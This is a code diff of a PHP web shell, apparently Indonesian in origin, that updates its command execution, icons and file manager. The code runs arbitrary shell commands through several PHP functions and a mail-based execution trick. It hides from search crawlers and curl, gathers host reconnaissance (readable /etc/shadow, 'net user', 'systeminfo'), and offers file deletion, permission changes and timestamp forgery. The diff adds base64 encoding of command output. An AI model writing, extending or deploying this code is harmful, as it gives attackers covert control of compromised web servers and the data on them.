@@ -17,36 +17,19 @@ if(!function_exists('array_column')){
 	function array_column(array $input, $columnKey, $indexKey = null){
 		$array = array();
 		foreach($input as $value){
-			if(!array_key_exists($columnKey, $value)){
-				trigger_error("Key \"$columnKey\" does not exist in array");
-				return false;
-			}
+			if(!array_key_exists($columnKey, $value)){trigger_error("Key \"$columnKey\" does not exist in array"); return false;}
 			if(is_null($indexKey)){
 				$array[] = $value[$columnKey];
 			} else {
-				if(!array_key_exists($indexKey, $value)){
-					trigger_error("Key \"$indexKey\" does not exist in array");
-					return false;
-				}
-				if(!is_scalar($value[$indexKey])){
-					trigger_error("Key \"$indexKey\" does not contain scalar value");
-					return false;
-				}
+				if(!array_key_exists($indexKey, $value)){trigger_error("Key \"$indexKey\" does not exist in array");return false;}
+				if(!is_scalar($value[$indexKey])){trigger_error("Key \"$indexKey\" does not contain scalar value");return false;}
 				$array[$value[$indexKey]] = $value[$columnKey];
 			}
 		}
 		return $array;
 	}
 }
-if(!function_exists("scandir")){
-	function scandir($dir) {
-		$dh = @opendir($dir);
-		while (false !== ($filename = @readdir($dh))){
-			$files[] = $filename;
-		}
-		return $files;
-	}
-}
+if(!function_exists("scandir")){function scandir($dir) { $dh = @opendir($dir); while (false !== ($filename = @readdir($dh))){ $files[] = $filename; }return $files;}}
 function blockCrawler(){
 	if(!empty($_SERVER['HTTP_USER_AGENT'])){
 		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
@@ -78,7 +61,7 @@ function serverSecInfo(){
 	function showInf($n, $v) {
 		$x = '<blockquote class="blockquote p-3 bg-success-rgb rounded">';
 		$v = trim($v);
-		if($v){$x .= '<p class="mb-0 text-success">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer text-light">'.$v.'</footer>' : '<footer class="blockquote-footer text-light"><pre class="text-light small">'.$v.'</pre></footer>';}
+		if($v){$x .= '<p class="mb-0 text-success">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer text-light">'.$v.'</footer>' : '<footer class="blockquote-footer text-light"><pre class="text-light">'.$v.'</pre></footer>';}
 		return $x.'</blockquote>';
 	}
 	if(AvFunc(array('mysql_get_client_info'))){$temp[] = "MySQL (" . @mysql_get_client_info(). ")";}
@@ -109,24 +92,35 @@ function serverSecInfo(){
 			$sInfo[] = showInf('Readable /etc/shadow', (@is_readable('/etc/shadow') ? "Yes" : "No"));			
 		}
 	} else {
-		$sInfo[] = showInf('OS Version', cmd("ver", $_SESSION['path'])['stdout']);
+		$sInfo[] = showInf('OS Version', base64_decode(cmd("ver", $_SESSION['path'])['stdout']));
 		if(AvFunc(array('iconv'))){
-			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', cmd("net accounts", $_SESSION['path'])['stdout']));
-			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', cmd("net user", $_SESSION['path'])['stdout']));
-			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',cmd("systeminfo", $_SESSION['path'])['stdout']));
+			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(cmd("net accounts", $_SESSION['path'])['stdout'])));
+			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(cmd("net user", $_SESSION['path'])['stdout'])));
+			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',base64_decode(cmd("systeminfo", $_SESSION['path'])['stdout'])));
 		}
 	}
 	$sInfo = array_filter($sInfo, function($str){return strpos($str, '<blockquote class="blockquote p-3 bg-success-rgb rounded"></blockquote>') === false;});
 	return array_values(array_filter(array_unique($sInfo)));
 }
-function fType($a){
+function fType($a,$c=null){
+	$c = !empty($c) ? $c : '2em';
 	switch($a){
-		case 'home' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>'; break;
-		case 'dir' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 512 512"><path fill="var(--bg-icon)" d="M0 96C0 60.7 28.7 32 64 32H196.1c19.1 0 37.4 7.6 50.9 21.1L289.9 96H448c35.3 0 64 28.7 64 64V416c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V96zM64 80c-8.8 0-16 7.2-16 16V416c0 8.8 7.2 16 16 16H448c8.8 0 16-7.2 16-16V160c0-8.8-7.2-16-16-16H286.6c-10.6 0-20.8-4.2-28.3-11.7L213.1 87c-4.5-4.5-10.6-7-17-7H64z"/></svg>'; break;
-		case 'file' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>'; break;
-		case 'info' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 16 16"><path fill="var(--bg-icon)" d="M8,0 C12.4183,0 16,3.58173 16,8 C16,12.4183 12.4183,16 8,16 C3.58167,16 0,12.4183 0,8 C0,3.58173 3.58167,0 8,0 Z M8,2 C4.68628,2 2,4.68628 2,8 C2,11.3137 4.68628,14 8,14 C11.3137,14 14,11.3137 14,8 C14,4.68628 11.3137,2 8,2 Z M8,7 C8.51280357,7 8.93550255,7.38604429 8.99327177,7.88337975 L9,8 L9,11 C9,11.5523 8.55225,12 8,12 C7.48719643,12 7.06449745,11.613973 7.00672823,11.1166239 L7,11 L7,8 C7,7.44772 7.44775,7 8,7 Z M8,4 C8.55225,4 9,4.44772 9,5 C9,5.55228 8.55225,6 8,6 C7.44775,6 7,5.55228 7,5 C7,4.44772 7.44775,4 8,4 Z"/></svg>'; break;
-		case 'edit' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="1.2em" viewBox="0 0 348.882 348.882"><path fill="var(--warning)" d="M333.988,11.758l-0.42-0.383C325.538,4.04,315.129,0,304.258,0c-12.187,0-23.888,5.159-32.104,14.153L116.803,184.231 c-1.416,1.55-2.49,3.379-3.154,5.37l-18.267,54.762c-2.112,6.331-1.052,13.333,2.835,18.729c3.918,5.438,10.23,8.685,16.886,8.685 c0,0,0.001,0,0.001,0c2.879,0,5.693-0.592,8.362-1.76l52.89-23.138c1.923-0.841,3.648-2.076,5.063-3.626L336.771,73.176 C352.937,55.479,351.69,27.929,333.988,11.758z M130.381,234.247l10.719-32.134l0.904-0.99l20.316,18.556l-0.904,0.99 L130.381,234.247z M314.621,52.943L182.553,197.53l-20.316-18.556L294.305,34.386c2.583-2.828,6.118-4.386,9.954-4.386 c3.365,0,6.588,1.252,9.082,3.53l0.419,0.383C319.244,38.922,319.63,47.459,314.621,52.943z"/><path fill="var(--info)" d="M303.85,138.388c-8.284,0-15,6.716-15,15v127.347c0,21.034-17.113,38.147-38.147,38.147H68.904 c-21.035,0-38.147-17.113-38.147-38.147V100.413c0-21.034,17.113-38.147,38.147-38.147h131.587c8.284,0,15-6.716,15-15 s-6.716-15-15-15H68.904c-37.577,0-68.147,30.571-68.147,68.147v180.321c0,37.576,30.571,68.147,68.147,68.147h181.798 c37.576,0,68.147-30.571,68.147-68.147V153.388C318.85,145.104,312.134,138.388,303.85,138.388z"/></svg>'; break;
-		default : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>';
+		case 'logo'	: $b = 'https://clipart-library.com/data_images/554935.png'; break;
+		case 'home' : $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--cyan)" d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1V472c0 22.1-17.9 40-40 40H456c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1H416 392c-22.1 0-40-17.9-40-40V448 384c0-17.7-14.3-32-32-32H256c-17.7 0-32 14.3-32 32v64 24c0 22.1-17.9 40-40 40H160 128.1c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2H104c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9 .1-2.8V287.6H32c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>'; break;
+		case 'dir'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>'; break;
+		case 'php'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm97 289c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0L79 303c-9.4 9.4-9.4 24.6 0 33.9l48 48c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-31-31 31-31zM257 255c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l31 31-31 31c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l48-48c9.4-9.4 9.4-24.6 0-33.9l-48-48z"/></svg>'; break;
+		case 'zip'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16h48c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16h48v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm48 112c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm0 64c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H128c-8.8 0-16 7.2-16 16zm-6.3 71.8L82.1 335.9c-1.4 5.4-2.1 10.9-2.1 16.4c0 35.2 28.8 63.7 64 63.7s64-28.5 64-63.7c0-5.5-.7-11.1-2.1-16.4l-23.5-88.2c-3.7-14-16.4-23.8-30.9-23.8H136.6c-14.5 0-27.2 9.7-30.9 23.8zM128 336h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H128c-8.8 0-16-7.2-16-16s7.2-16 16-16z"/></svg>'; break;
+		case 'img'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160H256c-17.7 0-32-14.3-32-32V0H64zM256 0V128H384L256 0zM64 256a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm152 32c5.3 0 10.2 2.6 13.2 6.9l88 128c3.4 4.9 3.7 11.3 1 16.5s-8.2 8.6-14.2 8.6H216 176 128 80c-5.8 0-11.1-3.1-13.9-8.1s-2.8-11.2 .2-16.1l48-80c2.9-4.8 8.1-7.8 13.7-7.8s10.8 2.9 13.7 7.8l12.8 21.4 48.3-70.2c3-4.3 7.9-6.9 13.2-6.9z"/></svg>'; break;
+		case 'txt'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>'; break;
+		case 'css'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M480 32l-64 368-223.3 80L0 400l19.6-94.8h82l-8 40.6L210 390.2l134.1-44.4 18.8-97.1H29.5l16-82h333.7l10.5-52.7H56.3l16.3-82H480z"/></svg>'; break;
+		case 'js'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M0 32v448h448V32H0zm243.8 349.4c0 43.6-25.6 63.5-62.9 63.5-33.7 0-53.2-17.4-63.2-38.5l34.3-20.7c6.6 11.7 12.6 21.6 27.1 21.6 13.8 0 22.6-5.4 22.6-26.5V237.7h42.1v143.7zm99.6 63.5c-39.1 0-64.4-18.6-76.7-43l34.3-19.8c9 14.7 20.8 25.6 41.5 25.6 17.4 0 28.6-8.7 28.6-20.8 0-14.4-11.4-19.5-30.7-28l-10.5-4.5c-30.4-12.9-50.5-29.2-50.5-63.5 0-31.6 24.1-55.6 61.6-55.6 26.8 0 46 9.3 59.8 33.7L368 290c-7.2-12.9-15-18-27.1-18-12.3 0-20.1 7.8-20.1 18 0 12.6 7.8 17.7 25.9 25.6l10.5 4.5c35.8 15.3 55.9 31 55.9 66.2 0 37.8-29.8 58.6-69.7 58.6z"/></svg>'; break;
+		case 'html' : $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M0 32l34.9 395.8L191.5 480l157.6-52.2L384 32H0zm308.2 127.9H124.4l4.1 49.4h175.6l-13.6 148.4-97.9 27v.3h-1.1l-98.7-27.3-6-75.8h47.7L138 320l53.5 14.5 53.7-14.5 6-62.2H84.3L71.5 112.2h241.1l-4.4 47.7z"/></svg>'; break;
+		case 'other': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M320 464c8.8 0 16-7.2 16-16V160H256c-17.7 0-32-14.3-32-32V48H64c-8.8 0-16 7.2-16 16V448c0 8.8 7.2 16 16 16H320zM0 64C0 28.7 28.7 0 64 0H229.5c17 0 33.3 6.7 45.3 18.7l90.5 90.5c12 12 18.7 28.3 18.7 45.3V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64z"/></svg>'; break;
+		case 'info'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>'; break;
+		case 'edit'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>'; break;
+		case 'cmd'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>'; break;
+		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--light)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
+		case 'loader': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--cyan)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
 	}
 	return $b;
 }
@@ -142,13 +136,11 @@ function procopen($cmd){
 			if(is_resource($process)){
 				$stdout = ""; $buffer = "";
 				do {
-					$buffer = fread($pipes[1], $GLOBALS['chunk_size']);
-					$stdout = $stdout . $buffer;
+					$buffer = fread($pipes[1], $GLOBALS['chunk_size']); $stdout = $stdout . $buffer;
 				} while ((!feof($pipes[1])) && (strlen($buffer) != 0));
 				$stderr = ""; $buffer = "";
 				do {
-					$buffer = fread($pipes[2], $GLOBALS['chunk_size']);
-					$stderr = $stderr . $buffer;
+					$buffer = fread($pipes[2], $GLOBALS['chunk_size']); $stderr = $stderr . $buffer;
 				} while ((!feof($pipes[2])) && (strlen($buffer) != 0));
 				fclose($pipes[1]);
 				fclose($pipes[2]);
@@ -174,8 +166,8 @@ function fakemail($func, $cmd){
 	} else {
 		$send = @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
 	}
-	if($send){sleep(5);}
-	return @file_get_contents("geiss.txt");
+	if($send){@file_get_contents("geiss.txt");}
+	return sleep(5);
 }
 function cf($f,$t){
 	if(AvFunc(array('fopen','fwrite','fputs','fclose'))){
@@ -191,15 +183,11 @@ function cf($f,$t){
 	}
 }
 function expandPath($path) {
-    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
-        cmd("echo $match[1]", $stdout);
-        return $stdout[0] . $match[2];
-    }
+    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
     return $path;
 }
 function cmd($cmdx, $path){
     $stdout = '';
-	if(!preg_match('/2>/', $cmdx)){$cmdx.=' 2>&1';}
 	if(AvFunc(array('chdir'))){
 		if(preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)){
 			@chdir(expandPath("~"));
@@ -212,12 +200,20 @@ function cmd($cmdx, $path){
 			$stdout = ex($cmdx);
 		}
 	}
+	$cfg = array('username' => 'Z190T', 'hostname' => 'shell');
+	if($GLOBALS['os'] == 'nix'){
+		if(AvFunc(array('posix_getpwuid','posix_geteuid'))){ $pwuid = @posix_getpwuid(@posix_geteuid());if($pwuid !== false){ $cfg['username'] = $pwuid['name'];}}
+	} else {
+		if(AvFunc(array('getenv'))){ $username = @getenv('USERNAME');if($username !== false){ $cfg['username'] = $username;}}
+	}
+	if(AvFunc(array('gethostname'))){ $hostname = @gethostname(); if($hostname !== false){ $cfg['hostname'] = $hostname;}}
 	$_SESSION['path'] = AvFunc(array('getcwd')) ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
-    return array('stdout' => $stdout, 'path' => $_SESSION['path']);
+    return array('userhost' => base64_encode($cfg['username']."@".$cfg['hostname']), 'path' => base64_encode($_SESSION['path']), 'stdout' => base64_encode($stdout));
 }
 function ex($init){
 	$out = '';
 	$arrCmd = array('proc_open', 'popen', 'exec', 'passthru', 'system', 'shell_exec', 'mail', 'mb_send_mail');
+	if(!preg_match('/2>/', $init)){$init.=' 2>&1';}
 	$tmpout = `$init`;
 	if(strlen($tmpout)>0){
 		$out = $tmpout;
@@ -293,11 +289,7 @@ function xrmdir($dir){
 				continue;
 			}
 			$path = $dir.'/'.$item;
-			if(@is_dir($path)){
-				xrmdir($path);
-			} else {
-				@unlink($path);
-			}
+			if(@is_dir($path)){ xrmdir($path); } else { @unlink($path); }
 		}
 		rmdir($dir);
 	}
@@ -326,7 +318,7 @@ function pathberkas($a){
 	$lb = explode('/', $a);
 	if(isset($lb) && count($lb)>0){
 		$outs = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
-		$outs .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="'.(@getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT']).'">'.fType("home").'</button>';
+		$outs .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="'.(@getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT']).'">'.fType("home","1.2em").'</button>';
 		$outs .= '<ol class="breadcrumb w-100" style="margin-top:revert; padding-right:0;">';
 		foreach($lb as $id => $lok){
 			if($lok == '' && $id == 0){
@@ -344,7 +336,7 @@ function pathberkas($a){
 			}
 			$outs .= '">'.$lok.'</a></li>';
 		}
-		$outs .= '<li class="ml-auto"><a href="javascript:void(0);" id="chdir" data-path="'.$_SESSION['path'].'">'.fType("edit").'</a></li>';
+		$outs .= '<li class="ml-auto"><a href="javascript:void(0);" id="chdir" data-path="'.$_SESSION['path'].'">'.fType("edit","1.2em").'</a></li>';
 		$outs .= "</ol></nav>";
 	} else {
 		$outs = "<code>gak bisa baca direktori ini gess..</code>";
@@ -369,7 +361,7 @@ function filemanager($fm){
 					$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
 					$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
 				} else {
-					$formper = statusnya($dir['full_path']);					
+					$formper = statusnya($dir['full_path']);
 					$formsel = "";
 				}
 				$fmtable .= "<tr>
@@ -384,17 +376,38 @@ function filemanager($fm){
 			} else {
 				$fcolor = stColor($dir['full_path']);
 				$flinks = !is_readable($dir['full_path']) ? '-' : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
+				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
 				$zadd = '';
-				if(class_exists('ZipArchive')){
-					$zadd .= "<option value='zip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";						
-					$fnm = explode('.',$dir['entry']);
-					if(strtolower(ucwords(end($fnm))) == 'zip'){
-						$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>unzip</option>";						
+				if(!empty($ext)){
+					if($ext == 'css'){
+						$ftype = fType('css','1.5em');
+					} else if(in_array($ext, array('txt','ini'))){
+						$ftype = fType('txt');
+					} else if(in_array($ext, array('js','json'))){
+						$ftype = fType('js','1.8em');
+					} else if(in_array($ext, array('php','phtml','php5','php7'))){
+						$ftype = fType('php');
+					} else if(in_array($ext, array('html','shtml'))){
+						$ftype = fType('html');
+					} else if(in_array($ext, array('zip','rar','tar','tar.bz'))){
+						$ftype = fType('zip');
+					} else if(in_array($ext, array('jpg','png','bmp','gif','psd','jpeg','webp','ai','xcf','cdr','tif','tiff','eps'))){
+						$ftype = fType('img');
+					} else {
+						$ftype = fType('other');
 					}
+					if(class_exists('ZipArchive')){
+						$zadd .= "<option value='zip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";						
+						if($ext == 'zip'){
+							$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>unzip</option>";						
+						}
+					}
+				} else {
+					$ftype = fType('other');
 				}
 				$fmtable .= "<tr>
 					<td class='text-left align-middle'>
-						<div class='media file'>".fType('file')."<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
+						<div class='media file'>{$ftype}<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
 					</td>
 					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
 					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
@@ -418,11 +431,13 @@ if(isset($_GET['act'])){
 		if(isset($_POST['cmd'])){
 			if(!empty($_POST['cmd']) || strlen($_POST['cmd'])>1){
 				$sendreq = cmd($_POST['cmd'], $_POST['xpath']);
